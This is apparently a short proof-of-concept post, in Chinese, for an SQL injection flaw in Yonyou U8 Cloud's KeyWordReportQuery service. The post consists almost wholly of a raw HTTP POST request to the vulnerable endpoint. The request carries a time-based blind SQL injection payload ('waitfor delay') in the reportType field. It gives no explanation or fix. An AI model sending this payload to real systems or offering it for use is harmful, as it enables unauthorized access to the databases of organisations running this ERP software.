## 用友U8 Cloud-KeyWordReportQuery存在SQL注入漏洞


## poc
```
POST /service/~iufo/nc.itf.iufo.mobilereport.data.KeyWordReportQuery HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

{"reportType":"1';waitfor delay '0:0:3'-- ","pageInfo":{"currentPageIndex":1,"pageSize":1},"keyword":[]}
```
